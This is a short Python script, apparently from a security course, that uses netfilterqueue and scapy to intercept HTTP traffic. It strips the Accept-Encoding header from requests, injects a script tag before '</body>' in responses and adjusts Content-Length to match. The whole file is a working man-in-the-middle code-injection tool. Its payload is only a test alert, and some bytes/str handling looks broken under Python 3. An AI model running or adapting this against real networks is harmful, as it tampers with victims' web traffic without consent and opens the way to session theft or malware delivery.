#!/usr/bin/env python3
# Rebuild - View README for testing parameters.
import netfilterqueue
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import Raw
import re

AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
replace_load = ""
# Content-Length non capturing group, return value, but not the key for the value.
ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
injection_code = "<script>alert('Test!'); </script>"

# Take our modified load and set it to the packet load
def set_load(packet, load):
    packet[Raw].load = load
    # For scapy to recalculate IP and Chksum for updated load, delete them
    # Making the change from del, to *= None, does not affect the results
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    if packet.haslayer(UDP):
        del packet[UDP].len
        del packet[UDP].chksum
    return packet

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load
        if scapy_packet.haslayer(TCP):
            # print("\n[+] Packet has layer TCP")
            if scapy_packet[TCP].dport == 80:
                print("[+] HTTP Request:  ")
                # Find "Accept-Encoding" in payload, replace with ""
                load = re.sub(
                    "Accept-Encoding:.*?\\r\\n",
                    "",
                    load,
                    flags=re.IGNORECASE | re.MULTILINE
                )

            elif scapy_packet[TCP].sport == 80:
                print("[+] HTTP Response:  ")
                # print(scapy_packet.show())
                # method replace string with another string
                load = load.replace("</body>", injection_code + "</body>")
                # return the Content-Length value, but not Content-Lenth, from regex search
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                # if we return a value from re.search
                if content_length_search:
                    # assign the second element in the group to a var
                    content_length = content_length_search.group(1)
                    # calculate the new content length
                    new_content_length = 0
                    new_content_length = int(content_length) + len(injection_code)
                    # Assign the new content length to load
                    load = load.replace(content_length, str(new_content_length))

            # if load updated, set the load to new_packet, set new_packet as packet
            if load != scapy_packet[Raw].load:
                # Create a new packet
                new_packet = set_load(scapy_packet, load)
                # set the new packet with the updated payload as the packet
                packet.set_payload(str(new_packet))

    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet)
    queue.run()
